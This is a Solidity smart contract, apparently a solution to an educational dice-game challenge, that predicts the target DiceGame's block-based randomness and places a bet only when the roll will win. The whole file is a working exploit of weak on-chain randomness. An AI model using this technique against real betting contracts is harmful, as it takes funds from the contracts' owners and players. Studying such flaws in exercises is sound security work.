pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    event Difficulty(address indexed player, uint256 difficulty);
    event Roll(address indexed player, uint256 roll);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(address(this).balance >= .002 ether, "not enough ether");
        //bytes32 prevHash = blockhash(block.number - 1);
        console.log("difficulty: ", block.difficulty);

        emit Difficulty(msg.sender, block.difficulty);

        bytes32 hash = keccak256(abi.encodePacked(block.difficulty, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        emit Roll(msg.sender, roll);

        console.log("THE ROLL IS ",roll);

        require (roll <= 2, "no win");

        diceGame.rollTheDice{value: .002 ether}();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {  }
}
